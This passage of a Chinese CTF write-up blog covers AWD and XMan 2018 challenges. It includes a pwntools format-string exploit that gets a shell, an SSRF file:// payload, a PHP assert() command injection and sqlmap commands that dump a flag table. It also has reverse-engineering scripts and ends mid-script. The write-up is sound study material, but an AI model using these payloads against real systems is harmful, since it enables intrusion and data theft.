[rbp-58h] __int128 v3; // [rsp+28h] [rbp-38h] __int64 *v4; // [rsp+38h] [rbp-28h] char *v5; // [rsp+40h] [rbp-20h] __int64 (__fastcall *v6)(_QWORD, _QWORD); // [rsp+48h] [rbp-18h] unsigned __int64 v7; // [rsp+58h] [rbp-8h] v7 = __readfsqword(0x28u); printf(\"guess a number:\"); v3 = 0uLL; v5 = command; v6 = (__int64 (__fastcall *)(_QWORD, _QWORD))((char *)getshell + 317); readline((__int64)nptr, 0x18u); fd = open(\"/dev/random\", 0); read(fd, &amp;v3, 2uLL); read(fd, (char *)&amp;v3 + 8, 2uLL); v2 = atoi(nptr); v4 = &amp;v2; sleep(1u); printf(\"you guess \", (char *)&amp;v3 + 8); printf(nptr); printf(\" the answer is %lld \\n\", (_QWORD)v3 + *((_QWORD *)&amp;v3 + 1)); if ( *v4 != (_QWORD)v3 + *((_QWORD *)&amp;v3 + 1) ) &#123; puts(\"GG!\"); exit(0); &#125; system(command); return __readfsqword(0x28u) ^ v7;&#125; 可以看到这里让我们猜测一个系统产生的随机数，猜对了就能 getshell。再来看看 pizza 的 exp： 12345678from pwn import *p = process('./messageboard')p.recvuntil('choice &gt;&gt;')p.sendline('4')p.recvuntil('guess a number:')payload = '%2$*11$s%2$*12$s%13$n'p.sendline(payload)p.interactive() 关于*：宽度与精度格式化参数可以忽略，或者直接指定，或者用星号”*“表示取对应函数参数的值。例如printf(&quot;%*d&quot;, 5, 10)输出”10“；printf(&quot;%.*s&quot;, 3, &quot;abcdef&quot;)输出”abc“。 由此可知，第十一位和第十二位参数上存放的是随机数，第十三位则是我们的输入，这里将随机数的值写入我们的输入，达到 getshell 的目的。 堆的做法以后再来复现。 总结比赛打下来，发现实力是重要的一部分，同时经验、技巧（猥琐发育）以及运气都是重要的因素。希望下次有更多的机会参与线下 AWD 比赛。 参考网站https://www.jianshu.com/p/b8e448951125https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2","categories":[],"tags":[{"name":"ctf","slug":"ctf","permalink":"qianfei11.coding.me/tags/ctf/"},{"name":"wp","slug":"wp","permalink":"qianfei11.coding.me/tags/wp/"}]},{"title":"2018-XMan个人排位赛","slug":"2018-XMan个人排位赛","date":"2018-08-11T12:18:08.000Z","updated":"2019-08-26T01:15:17.592Z","comments":true,"path":"2018/08/11/2018-XMan个人排位赛/","link":"","permalink":"qianfei11.coding.me/2018/08/11/2018-XMan个人排位赛/","excerpt":"唉 pwn 还是没有入门。","text":"唉 pwn 还是没有入门。 MISCFILE用DiskGenius恢复磁盘： XMAN 通行证不同的网站解密结果竟然不一样。最后发现这个网站还行。 1a2FuYmJyZ2doamx7emJfX19ffXZ0bGFsbg== 第一眼就知道先是 base64： 1kanbbrgghjl&#123;zb____&#125;vtlaln 栅栏 7 栏加密： 1kzna&#123;blnl_abj_lbh_trg_vg&#125; 凯撒位移 13 位得到 flag： 1xman&#123;oyay_now_you_get_it&#125; PPAP用 wireshark 打开，搜索关键字 flag，很容易找到一串 base64： 经过分析以后，具体结构应该是这样的： 123456789101112131415yaaaaaaaar, land ho! Hey wesley, you got that flag?Ayy, I got yer files right here, matey! [base64&apos;d jpg] [base64&apos;d flag.zip]And here be the map to the booty! [base64&apos;d Haar cascade] I don&apos;t understand, this isn&apos;t even a ma-Yarrrr, the booty be buried by that which the map points to! (no spaces and no caps)Ayy, now I be off. But remember, the factor of scales be 1.02, and the neighborly sorts be limited to 50!Lastly, if ye sail the seven seas, you do be a pirate! jpg 文件和 zip 文件之间通过等号判断分隔。通过 python 得到三个文件： 123456789# exampleimport base64f1 = open('b1', 'r')enc1 = f1.read()f2 = open('b1.jpg', 'w')out = base64.b64decode(enc1)f2.write(out)f1.close()f2.close() 然后又通过 binwalk 发现，这里输出的 jpg 图片其实不止一张。用 foremost 输出所有的图片。 下面用了官方的脚本，用 opencv 找出数百张图片的其中一张来得到密码： 12345678910111213141516171819202122232425import osimport sysimport cv2# Get all of the picturesimgs = os.listdir('jpg')# Cascade we'll be using for detectioncascade = cv2.CascadeClassifier('b3.xml')# From the cluesscaling_factor = 1.02min_neighbors = 10 # Bumped this up until one pic was leftfor img_name in imgs: # Load the image and run the cascade img = cv2.imread(os.path.join('jpg', img_name)) detect = cascade.detectMultiScale(img, scaling_factor, min_neighbors) if len(detect) &gt; 0: for (x, y, w, h) in detect: # X marks the spot! cv2.line(img, (x, y), (x + w, y + h), (255, 0, 0), 2) cv2.line(img, (x, y + h), (x + w, y), (255, 0, 0), 2) # Save the new image cv2.imwrite(os.path.join('detected', img_name), img) 最后得到一张海盗的图片，容易知道密码应该是 skullandcrossbones，得到 flag。 AUTOKEY一个 pcap 包，都是 usb 流量，通过tshark提取出来： 12 ⚡ root@kali  ~/Desktop  tshark -r task_AutoKey.pcapng -T fields -e usb.capdata &gt; usbdata.txtRunning as user \"root\" and group \"root\". This could be dangerous. 查看后发现都是八个字节的数据，那么应该是键盘流量，用脚本跑出来： 1234567891011121314151617181920#!usr/bin/env python#-*- coding:utf-8 -*-mappings = &#123; 0x04:\"A\", 0x05:\"B\", 0x06:\"C\", 0x07:\"D\", 0x08:\"E\", 0x09:\"F\", 0x0A:\"G\", 0x0B:\"H\", 0x0C:\"I\", 0x0D:\"J\", 0x0E:\"K\", 0x0F:\"L\", 0x10:\"M\", 0x11:\"N\",0x12:\"O\", 0x13:\"P\", 0x14:\"Q\", 0x15:\"R\", 0x16:\"S\", 0x17:\"T\", 0x18:\"U\",0x19:\"V\", 0x1A:\"W\", 0x1B:\"X\", 0x1C:\"Y\", 0x1D:\"Z\", 0x1E:\"1\", 0x1F:\"2\", 0x20:\"3\", 0x21:\"4\", 0x22:\"5\", 0x23:\"6\", 0x24:\"7\", 0x25:\"8\", 0x26:\"9\", 0x27:\"0\", 0x28:\"\\n\", 0x2a:\"[DEL]\", 0X2B:\" \", 0x2C:\" \", 0x2D:\"-\", 0x2E:\"=\", 0x2F:\"[\", 0x30:\"]\", 0x31:\"\\\\\", 0x32:\"~\", 0x33:\";\", 0x34:\"'\", 0x36:\",\", 0x37:\".\" &#125;nums = []keys = open('usbdata.txt')for line in keys: if line[0]!='0' or line[1]!='0' or line[3]!='0' or line[4]!='0' or line[9]!='0' or line[10]!='0' or line[12]!='0' or line[13]!='0' or line[15]!='0' or line[16]!='0' or line[18]!='0' or line[19]!='0' or line[21]!='0' or line[22]!='0': continue nums.append(int(line[6:8],16))keys.close()output = \"\"for n in nums: if n == 0 : continue if n in mappings: output += mappings[n] else: output += '[unknown]'print 'output :\\n' + output 出来的结果： 12output :[unknown]A[unknown]UTOKEY&apos;&apos;.DECIPHER&apos;[unknown]MPLRVFFCZEYOUJFJKYBXGZVDGQAURKXZOLKOLVTUFBLRNJESQITWAHXNSIJXPNMPLSHCJBTYHZEALOGVIAAISSPLFHLFSWFEHJNCRWHTINSMAMBVEXO[DEL]PZE[DEL]IZ&apos; 去掉[uuknown]，[DEL]则是去掉后一个字符，得到： 12output :AUTOKEY&apos;&apos;.DECIPHER&apos;MPLRVFFCZEYOUJFJKYBXGZVDGQAURKXZOLKOLVTUFBLRNJESQITWAHXNSIJXPNMPLSHCJBTYHZEALOGVIAAISSPLFHLFSWFEHJNCRWHTINSMAMBVEXOZEZ&apos; 百度一下 autokey，用 github 上找到的的爆破脚本得到 flag。 123-676.914569565 autokey, klen 8 :&quot;FLAGHERE&quot;, HELLOBOYSANDGIRLSYOUARESOSMARTTHATYOUCANFINDTHEFLAGTHATIHIDEINTHEKEYBOARDPACKAGEFLAGISJHAWLZKEWXHNCDHSLWBAQJTUQZDXYQLFHELLO BOYS AND GIRLS YOU ARE SO SMART THAT YOU CAN FIND THE FLAG THAT I HIDE IN THE KEYBOARD PACKAGE FLAG IS JHAWLZKEWXHNCDHSLWBAQJTUQZDXYQLF WEBSIMPLE SSRFhint 里提示curl还有flag在/etc/flag.txt，大概是通过 file 协议读取本地文件。payload： 1file://www.baidu.com/etc/flag.txt# MAKEIT网页上提示了 git，猜测存在.git文件泄露，把源码下载下来之后审计： 1234567891011121314151617&lt;?phpif (isset($_GET['page'])) &#123; $page = $_GET['page'];&#125; else &#123; $page = \"home\";&#125;$file = \"templates/\" . $page . \".php\";// I heard '..' is dangerous!assert(\"strpos('$file', '..') === false\") or die(\"Detected hacking attempt!\");// TODO: Make this look niceassert(\"file_exists('$file')\") or die(\"That file doesn't exist!\");?&gt; 这里有assert()，可以执行函数中的命令，通过构造闭合前面的strpos()绕过，来得到templates/flag.php中的内容： 11&apos;, &apos;..&apos;) or system(&apos;cat templates/flag.php&apos;); // BBSQLIcookie 注入，PHPSESSID 拿下来： 用 sqlmap 跑： 123456// 跑表名python sqlmap.py -u http://202.112.51.184:16080/ --cookie \"PHPSESSID=0f3f8f5bcd396b7d83ea2799a77aea49\" --table --level 2// 跑列名python sqlmap.py -u http://202.112.51.184:16080/ --cookie \"PHPSESSID=0f3f8f5bcd396b7d83ea2799a77aea49\" --columns -T '[GDJM_flag]' --level 2// 跑flagpython sqlmap.py -u http://202.112.51.184:16080/ --cookie \"PHPSESSID=0f3f8f5bcd396b7d83ea2799a77aea49\" --dump -T '[GDJM_flag]' -C 'flag' --level 2 PS：不同的 level 等级，SQLMAP 所采用的策略也不近相同，当–level 的参数设定为 2 或者 2 以上的时候，sqlmap 会尝试注入 Cookie 参数；当–level 参数设定为 3 或者 3 以上的时候，会尝试对 User-Angent，referer 进行注入。 REDRAGON QUEST和 csaw 的那道 wyvern 很像，可以用 angr 跑出来： 12345678910111213141516171819202122232425262728#!/usr/bin/env pythonimport angrimport claripyp = angr.Project('task_xman1')flag_chars = [claripy.BVS('flag_%d' % i, 8) for i in range(28)] # flag's length is 28, every char is 8 bitflag = claripy.Concat(*flag_chars + [claripy.BVV(b'\\n')]) # end with '\\n'st = p.factory.full_init_state( args=['./xman_task1'], # arguments add_options=angr.options.unicorn, stdin=flag, # flag as input)for k in flag_chars: st.solver.add(k != 0) # char is not 0 st.solver.add(k != 10) # char is not '\\n'sm = p.factory.simulation_manager(st)sm.run()out = b''for pp in sm.deadended: out = pp.posix.dumps(1) if b'flag&#123;' in out: out = next(filter(lambda s: b'flag&#123;' in s, out.split())) breakprint('flag:', out) pizza 大佬提供了另一种思路。先用 ida-python 去混淆： 1234567891011121314151617181920import ida_xrefimport ida_idaapifrom ida_bytes import get_bytes, patch_bytesdef do_patch(ea): if(get_bytes(ea, 1) == \"\\x8B\"): # mov eax-edi, dword reg = (ord(get_bytes(ea + 1, 1)) &amp; 0b00111000) &gt;&gt; 3 patch_bytes(ea, chr(0xB8 + reg) + \"\\x00\\x00\\x00\\x00\\x90\\x90\") elif(get_bytes(ea, 2) == \"\\x44\\x8B\"): # mov r8d-r15d, dword reg = (ord(get_bytes(ea + 2, 1)) &amp; 0b00111000) &gt;&gt; 3 patch_bytes(ea + 1, chr(0xB8 + reg) + \"\\x00\\x00\\x00\\x00\\x90\\x90\")for addr in xrange(0x610318, 0x6105AC, 4): ref = ida_xref.get_first_dref_to(addr) print(hex(addr).center(20,\"-\")) while(ref != ida_idaapi.BADADDR): do_patch(ref) print(\"patch at \" + hex(ref)) ref = ida_xref.get_next_dref_to(addr, ref) print(\"-\"*20) 最后脚本： 12345678secret = [100, 214, 266, 369, 417, 527, 622, 733, 847, 942, 1054, 1106, 1222, 1336, 1441, 1540, 1589, 1686, 1796, 1891, 1996, 2112, 2165, 2260, 2336, 2412, 2498, 2575]n = 0flag = \"\"for i in xrange(0, len(secret)): ch = secret[i] - n n += ch flag += chr(ch)print(flag) EASYWASMgithub 上找到一个将 wasm 转成 c 的工具。命令：wasm2c easywasm.wasm -o easywasm.c 大概内容： 1234567891011121314151617181920212223242526272829303132333435363738394041...static void init_globals(void) &#123; g2 = 0u; g3 = 0u; _flag_enc = 0u; _k = 1104u; _r = 1360u;&#125;...static void _md5(u32 p0, u32 p1, u32 p2) &#123; ...&#125;static u32 _check(u32 p0) &#123; ...&#125;...static void init_memory(void) &#123; memcpy(&amp;((*Z_envZ_memory).data[(*Z_envZ_memoryBaseZ_i)]), data_segment_data_0, 1648);&#125;static void init_table(void) &#123; ...&#125;static void init_exports(void) &#123; ...&#125;void WASM_RT_ADD_PREFIX(init)(void) &#123; init_func_types(); init_globals(); init_memory(); init_table(); init_exports();&#125; 转换成 c 代码后，审计起来还是很累。硬逆出来： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162#!/usr/bin/env pythonimport hashlibdata = [0x35, 0x36, 0x32, 0x66, 0x65, 0x33, 0x63, 0x63, 0x35, 0x30, 0x30, 0x31, 0x34, 0x63, 0x32, 0x36, 0x30, 0x64, 0x39, 0x65, 0x38, 0x63, 0x66, 0x34, 0x65, 0x64, 0x33, 0x38, 0x63, 0x37, 0x37, 0x61, 0x00, 0x63, 0x30, 0x32, 0x32, 0x61, 0x64, 0x30, 0x63, 0x63, 0x30, 0x30, 0x37, 0x35, 0x61, 0x39, 0x61, 0x62, 0x31, 0x34, 0x62, 0x34, 0x31, 0x32, 0x61, 0x31, 0x30, 0x38, 0x32, 0x64, 0x35, 0x66, 0x33, 0x00, 0x36, 0x34, 0x63, 0x32, 0x38, 0x36, 0x63, 0x66, 0x63, 0x36, 0x32, 0x33, 0x61, 0x61, 0x38, 0x64, 0x37, 0x64, 0x66, 0x37, 0x63, 0x30, 0x38, 0x38, 0x65, 0x62, 0x66, 0x37, 0x64, 0x37, 0x31, 0x38, 0x00, 0x38, 0x33, 0x36, 0x36, 0x34, 0x62, 0x64, 0x65, 0x65, 0x34, 0x62, 0x36, 0x31, 0x33, 0x62, 0x37, 0x65, 0x37, 0x61, 0x35, 0x31, 0x62, 0x35, 0x32, 0x31, 0x33, 0x34, 0x37, 0x30, 0x61, 0x38, 0x64, 0x00, 0x62, 0x30, 0x32, 0x30, 0x62, 0x66, 0x35, 0x39, 0x38, 0x61, 0x61, 0x61, 0x32, 0x62, 0x33, 0x65, 0x30, 0x33, 0x65, 0x64, 0x30, 0x32, 0x63, 0x38, 0x35, 0x34, 0x33, 0x36, 0x32, 0x36, 0x38, 0x61, 0x00, 0x34, 0x66, 0x64, 0x61, 0x63, 0x35, 0x61, 0x63, 0x38, 0x30, 0x37, 0x35, 0x30, 0x36, 0x39, 0x33, 0x38, 0x31, 0x30, 0x33, 0x65, 0x37, 0x37, 0x35, 0x63, 0x35, 0x30, 0x30, 0x39, 0x39, 0x65, 0x64, 0x00, 0x34, 0x66, 0x64, 0x61, 0x63, 0x35, 0x61, 0x63, 0x38, 0x30, 0x37, 0x35, 0x30, 0x36, 0x39, 0x33, 0x38, 0x31, 0x30, 0x33, 0x65, 0x37, 0x37, 0x35, 0x63, 0x35, 0x30, 0x30, 0x39, 0x39, 0x65, 0x64, 0x00, 0x63, 0x32, 0x33, 0x31, 0x64, 0x36, 0x30, 0x37, 0x62, 0x36, 0x38, 0x32, 0x33, 0x66, 0x64, 0x30, 0x61, 0x36, 0x38, 0x65, 0x38, 0x31, 0x33, 0x37, 0x36, 0x30, 0x38, 0x30, 0x39, 0x37, 0x35, 0x34, 0x00, 0x64, 0x31, 0x36, 0x38, 0x63, 0x32, 0x31, 0x64, 0x31, 0x30, 0x33, 0x37, 0x31, 0x61, 0x35, 0x61, 0x62, 0x36, 0x31, 0x62, 0x63, 0x66, 0x65, 0x36, 0x63, 0x37, 0x35, 0x39, 0x65, 0x66, 0x36, 0x65, 0x00, 0x66, 0x36, 0x30, 0x64, 0x37, 0x30, 0x39, 0x63, 0x63, 0x66, 0x39, 0x38, 0x39, 0x64, 0x38, 0x34, 0x39, 0x30, 0x32, 0x38, 0x66, 0x39, 0x37, 0x61, 0x30, 0x33, 0x64, 0x32, 0x66, 0x33, 0x62, 0x61, 0x00, 0x61, 0x30, 0x31, 0x38, 0x34, 0x66, 0x38, 0x32, 0x34, 0x30, 0x65, 0x32, 0x66, 0x65, 0x34, 0x36, 0x38, 0x36, 0x31, 0x64, 0x63, 0x38, 0x64, 0x31, 0x35, 0x61, 0x38, 0x31, 0x39, 0x63, 0x62, 0x30, 0x00, 0x39, 0x64, 0x62, 0x65, 0x63, 0x34, 0x31, 0x34, 0x33, 0x33, 0x36, 0x65, 0x37, 0x34, 0x31, 0x65, 0x39, 0x63, 0x37, 0x33, 0x34, 0x32, 0x32, 0x64, 0x66, 0x35, 0x39, 0x64, 0x65, 0x32, 0x39, 0x37, 0x00, 0x36, 0x66, 0x62, 0x35, 0x32, 0x30, 0x39, 0x64, 0x38, 0x66, 0x63, 0x38, 0x62, 0x62, 0x38, 0x35, 0x30, 0x37, 0x32, 0x34, 0x35, 0x62, 0x63, 0x66, 0x61, 0x32, 0x34, 0x61, 0x65, 0x31, 0x31, 0x66, 0x00, 0x36, 0x66, 0x62, 0x35, 0x32, 0x30, 0x39, 0x64, 0x38, 0x66, 0x63, 0x38, 0x62, 0x62, 0x38, 0x35, 0x30, 0x37, 0x32, 0x34, 0x35, 0x62, 0x63, 0x66, 0x61, 0x32, 0x34, 0x61, 0x65, 0x31, 0x31, 0x66, 0x00, 0x30, 0x30, 0x63, 0x37, 0x37, 0x66, 0x62, 0x63, 0x36, 0x30, 0x61, 0x35, 0x62, 0x66, 0x63, 0x34, 0x36, 0x36, 0x64, 0x33, 0x64, 0x30, 0x36, 0x39, 0x38, 0x37, 0x36, 0x65, 0x63, 0x33, 0x34, 0x38, 0x00, 0x30, 0x30, 0x63, 0x37, 0x37, 0x66, 0x62, 0x63, 0x36, 0x30, 0x61, 0x35, 0x62, 0x66, 0x63, 0x34, 0x36, 0x36, 0x64, 0x33, 0x64, 0x30, 0x36, 0x39, 0x38, 0x37, 0x36, 0x65, 0x63, 0x33, 0x34, 0x38, 0x00, 0x64, 0x66, 0x33, 0x33, 0x34, 0x36, 0x34, 0x66, 0x62, 0x34, 0x37, 0x31, 0x63, 0x34, 0x36, 0x61, 0x62, 0x61, 0x66, 0x36, 0x39, 0x31, 0x63, 0x30, 0x30, 0x30, 0x61, 0x30, 0x65, 0x33, 0x30, 0x64, 0x00, 0x34, 0x66, 0x64, 0x61, 0x63, 0x35, 0x61, 0x63, 0x38, 0x30, 0x37, 0x35, 0x30, 0x36, 0x39, 0x33, 0x38, 0x31, 0x30, 0x33, 0x65, 0x37, 0x37, 0x35, 0x63, 0x35, 0x30, 0x30, 0x39, 0x39, 0x65, 0x64, 0x00, 0x66, 0x36, 0x30, 0x64, 0x37, 0x30, 0x39, 0x63, 0x63, 0x66, 0x39, 0x38, 0x39, 0x64, 0x38, 0x34, 0x39, 0x30, 0x32, 0x38, 0x66, 0x39, 0x37, 0x61, 0x30, 0x33, 0x64, 0x32, 0x66, 0x33, 0x62, 0x61, 0x00, 0x66, 0x63, 0x63, 0x39, 0x34, 0x61, 0x32, 0x30, 0x35, 0x39, 0x36, 0x66, 0x32, 0x36, 0x31, 0x39, 0x38, 0x36, 0x38, 0x66, 0x33, 0x61, 0x34, 0x62, 0x66, 0x35, 0x32, 0x65, 0x61, 0x64, 0x66, 0x37, 0x00, 0x30, 0x30, 0x63, 0x37, 0x37, 0x66, 0x62, 0x63, 0x36, 0x30, 0x61, 0x35, 0x62, 0x66, 0x63, 0x34, 0x36, 0x36, 0x64, 0x33, 0x64, 0x30, 0x36, 0x39, 0x38, 0x37, 0x36, 0x65, 0x63, 0x33, 0x34, 0x38, 0x00, 0x64, 0x31, 0x36, 0x38, 0x63, 0x32, 0x31, 0x64, 0x31, 0x30, 0x33, 0x37, 0x31, 0x61, 0x35, 0x61, 0x62, 0x36, 0x31, 0x62, 0x63, 0x66, 0x65, 0x36, 0x63, 0x37, 0x35, 0x39, 0x65, 0x66, 0x36, 0x65, 0x00, 0x39, 0x64, 0x62, 0x65, 0x63, 0x34, 0x31, 0x34, 0x33, 0x33, 0x36, 0x65, 0x37, 0x34, 0x31, 0x65, 0x39, 0x63, 0x37, 0x33, 0x34, 0x32, 0x32, 0x64, 0x66, 0x35, 0x39, 0x64, 0x65, 0x32, 0x39, 0x37, 0x00, 0x66, 0x63, 0x63, 0x39, 0x34, 0x61, 0x32, 0x30, 0x35, 0x39, 0x36, 0x66, 0x32, 0x36, 0x31, 0x39, 0x38, 0x36, 0x38, 0x66, 0x33, 0x61, 0x34, 0x62, 0x66, 0x35, 0x32, 0x65, 0x61, 0x64, 0x66, 0x37, 0x00, 0x39, 0x62, 0x33, 0x37, 0x64, 0x62, 0x30, 0x39, 0x31, 0x39, 0x37, 0x39, 0x62, 0x65, 0x64, 0x66, 0x30, 0x30, 0x61, 0x37, 0x30, 0x39, 0x35, 0x38, 0x35, 0x31, 0x62, 0x61, 0x36, 0x66, 0x35, 0x39, 0x00, 0x30, 0x30, 0x63, 0x37, 0x37, 0x66, 0x62, 0x63, 0x36, 0x30, 0x61, 0x35, 0x62, 0x66, 0x63, 0x34, 0x36, 0x36, 0x64, 0x33, 0x64, 0x30, 0x36, 0x39, 0x38, 0x37, 0x36, 0x65, 0x63, 0x33, 0x34, 0x38, 0x00, 0x66, 0x36, 0x30, 0x64, 0x37, 0x30, 0x39, 0x63, 0x63, 0x66, 0x39, 0x38, 0x39, 0x64, 0x38, 0x34, 0x39, 0x30, 0x32, 0x38, 0x66, 0x39, 0x37, 0x61, 0x30, 0x33, 0x64, 0x32, 0x66, 0x33, 0x62, 0x61, 0x00, 0x66, 0x63, 0x63, 0x39, 0x34, 0x61, 0x32, 0x30, 0x35, 0x39, 0x36, 0x66, 0x32, 0x36, 0x31, 0x39, 0x38, 0x36, 0x38, 0x66, 0x33, 0x61, 0x34, 0x62, 0x66, 0x35, 0x32, 0x65, 0x61, 0x64, 0x66, 0x37, 0x00, 0x64, 0x31, 0x36, 0x38, 0x63, 0x32, 0x31, 0x64, 0x31, 0x30, 0x33, 0x37, 0x31, 0x61, 0x35, 0x61, 0x62, 0x36, 0x31, 0x62, 0x63, 0x66, 0x65, 0x36, 0x63, 0x37, 0x35, 0x39, 0x65, 0x66, 0x36, 0x65, 0x00, 0x66, 0x36, 0x30, 0x64, 0x37, 0x30, 0x39, 0x63, 0x63, 0x66, 0x39, 0x38, 0x39, 0x64, 0x38, 0x34, 0x39, 0x30, 0x32, 0x38, 0x66, 0x39, 0x37, 0x61, 0x30, 0x33, 0x64, 0x32, 0x66, 0x33, 0x62, 0x61, 0x00, 0x31, 0x38, 0x33, 0x33, 0x34, 0x32, 0x39, 0x39, 0x37, 0x66, 0x66, 0x65, 0x64, 0x34, 0x62, 0x33, 0x31, 0x38, 0x39, 0x65, 0x39, 0x37, 0x37, 0x64, 0x30, 0x37, 0x37, 0x61, 0x36, 0x30, 0x62, 0x34, 0x00, 0x66, 0x34, 0x30, 0x34, 0x61, 0x33, 0x33, 0x36, 0x38, 0x64, 0x32, 0x64, 0x38, 0x66, 0x35, 0x37, 0x34, 0x36, 0x34, 0x66, 0x37, 0x33, 0x39, 0x64, 0x34, 0x65, 0x64, 0x30, 0x31, 0x63, 0x30, 0x65, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x78, 0xa4, 0x6a, 0xd7, 0x56, 0xb7, 0xc7, 0xe8, 0xdb, 0x70, 0x20, 0x24, 0xee, 0xce, 0xbd, 0xc1, 0xaf, 0x0f, 0x7c, 0xf5, 0x2a, 0xc6, 0x87, 0x47, 0x13, 0x46, 0x30, 0xa8, 0x01, 0x95, 0x46, 0xfd, 0xd8, 0x98, 0x80, 0x69, 0xaf, 0xf7, 0x44, 0x8b, 0xb1, 0x5b, 0xff, 0xff, 0xbe, 0xd7, 0x5c, 0x89, 0x22, 0x11, 0x90, 0x6b, 0x93, 0x71, 0x98, 0xfd, 0x8e, 0x43, 0x79, 0xa6, 0x21, 0x08, 0xb4, 0x49, 0x62, 0x25, 0x1e, 0xf6, 0x40, 0xb3, 0x40, 0xc0, 0x51, 0x5a, 0x5e, 0x26, 0xaa, 0xc7, 0xb6, 0xe9, 0x5d, 0x10, 0x2f, 0xd6, 0x53, 0x14, 0x44, 0x02, 0x81, 0xe6, 0xa1, 0xd8, 0xc8, 0xfb, 0xd3, 0xe7, 0xe6, 0xcd, 0xe1, 0x21, 0xd6, 0x07, 0x37, 0xc3, 0x87, 0x0d, 0xd5, 0xf4, 0xed, 0x14, 0x5a, 0x45, 0x05, 0xe9, 0xe3, 0xa9, 0xf8, 0xa3, 0xef, 0xfc, 0xd9, 0x02, 0x6f, 0x67, 0x8a, 0x4c, 0x2a, 0x8d, 0x42, 0x39, 0xfa, 0xff, 0x81, 0xf6, 0x71, 0x87, 0x22, 0x61, 0x9d, 0x6d, 0x0c, 0x38, 0xe5, 0xfd, 0x44, 0xea, 0xbe, 0xa4, 0xa9, 0xcf, 0xde, 0x4b, 0x60, 0x4b, 0xbb, 0xf6, 0x70, 0xbc, 0xbf, 0xbe, 0xc6, 0x7e, 0x9b, 0x28, 0xfa, 0x27, 0xa1, 0xea, 0x85, 0x30, 0xef, 0xd4, 0x05, 0x1d, 0x88, 0x04, 0x39, 0xd0, 0xd4, 0xd9, 0xe5, 0x99, 0xdb, 0xe6, 0xf8, 0x7c, 0xa2, 0x1f, 0x65, 0x56, 0xac, 0xc4, 0x44, 0x22, 0x29, 0xf4, 0x97, 0xff, 0x2a, 0x43, 0xa7, 0x23, 0x94, 0xab, 0x39, 0xa0, 0x93, 0xfc, 0xc3, 0x59, 0x5b, 0x65, 0x92, 0xcc, 0x0c, 0x8f, 0x7d, 0xf4, 0xef, 0xff, 0xd1, 0x5d, 0x84, 0x85, 0x4f, 0x7e, 0xa8, 0x6f, 0xe0, 0xe6, 0x2c, 0xfe, 0x14, 0x43, 0x01, 0xa3, 0xa1, 0x11, 0x08, 0x4e, 0x82, 0x7e, 0x53, 0xf7, 0x35, 0xf2, 0x3a, 0xbd, 0xbb, 0xd2, 0xd7, 0x2a, 0x91, 0xd3, 0x86, 0xeb, 0x07, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x07, 0x00, 0x00, 0x00, 0x0c, 0x00, 0x00, 0x00, 0x11, 0x00, 0x00, 0x00, 0x16, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x05, 0x00, 0x00, 0x00, 0x09, 0x00, 0x00, 0x00, 0x0e, 0x00, 0x00, 0x00, 0x14, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00, 0x04, 0x00, 0x00, 0x00, 0x0b, 0x00, 0x00, 0x00, 0x10, 0x00, 0x00, 0x00, 0x17, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00, 0x06, 0x00, 0x00, 0x00, 0x0a, 0x00, 0x00, 0x00, 0x0f, 0x00, 0x00, 0x00, 0x15, 0x00, 0x00, 0x00, 0x32, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33, 0x33]s = ''for c in data: s += chr(c)# print senc = 